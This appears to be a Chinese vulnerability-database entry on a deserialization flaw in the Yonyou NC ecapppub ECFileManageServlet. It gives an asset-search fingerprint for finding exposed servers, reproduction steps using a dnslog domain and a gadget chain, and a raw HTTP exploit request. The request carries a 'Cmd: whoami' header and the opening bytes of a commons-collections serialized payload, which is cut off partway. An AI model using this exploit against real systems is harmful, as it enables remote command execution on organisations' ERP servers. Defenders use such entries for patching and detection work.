# 用友NCecapppub存在反序列化漏洞

- **系统**：用友　|　**类型**：反序列化　|　**CVE**：—
- **指纹**：`app.name=="用友 UAP"`
- **请求**：`POST /servlet/~ecapppub/nc.impl.ecpubapp.filemanager.service.ECFileManageServlet HTTP/1.1`

**请求体 / payload**
```
1. 用yakit生成dnslog域名
2. 生成利用链子
3. 探测漏洞
Host: {hostname}
Cmd: whoami
Cookie: JSESSIONID=7CF897B7660652E12F2CEA8A927D251A
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
{{hexd(paylaod)}}

POST /servlet/~ecapppub/nc.impl.ecpubapp.filemanager.service.ECFileManageServlet HTTP/1.1
Host: 192.168.31.16:81
Cmd: whoami
Content-Length: 20434
{{unquote("\xac\xed\x00\x05sr\x00\x11java.util.HashSet\xbaD\x85\x95\x96\xb8\xb74\x03\x00\x00xpw\x0c\x00\x00\x00\x01?@\x00\x00\x00\x00\x00\x01sr\x004org.apache.commons.collections.keyvalue.TiedMapEntry\x8a\xad\xd2\x9b9\xc1\x1f\xdb\x02\x00\x02L\x00\x…（脚本共 20779 字，完整版见原文）
```

**其他**
- 用友NC ecapppub存在反序列化漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 用友NC